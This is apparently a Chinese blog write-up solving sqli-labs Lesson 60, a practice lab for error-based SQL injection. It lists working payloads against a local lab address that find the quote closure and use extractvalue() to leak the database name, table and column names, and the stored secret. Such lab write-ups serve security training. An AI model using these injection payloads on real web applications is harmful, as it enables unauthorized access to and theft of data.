---
title: sqli-labs lession-60 GET-双注入-变化3-仅允许5次请求
date: 2018-11-29 10:02:28
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-60 GET-双注入-变化3-仅允许5次请求

---

## 手注

对常见的`'")`进行测试

`http://10.60.17.35:8082/Less-60/?id=1"+or+1=2%23`

发现报错

最终测试出闭合`")`

`http://10.60.17.35:8082/Less-60/?id=1")+and+extractvalue(null,concat(0x7e,database(),0x7e))%23`

![001](/img/sql/Lesson-60/001.png)

`http://10.60.17.35:8082/Less-60/?id=1")+and+extractvalue(null,concat(0x7e,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema='challenges'),0x7e))%23`

![002](/img/sql/Lesson-60/002.png)

`http://10.60.17.35:8082/Less-60/?id=1")+and+extractvalue(null,concat(0x7e,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema='challenges'+and+table_name='j5429wlony'),0x7e))%23`

![003](/img/sql/Lesson-60/003.png)

`http://10.60.17.35:8082/Less-60/?id=1")+and+extractvalue(null,concat(0x7e,(select+GROUP_CONCAT(secret_RPNY)from challenges.j5429wlony),0x7e))%23`

![004](/img/sql/Lesson-60/004.png)

提交

![005](/img/sql/Lesson-60/005.png)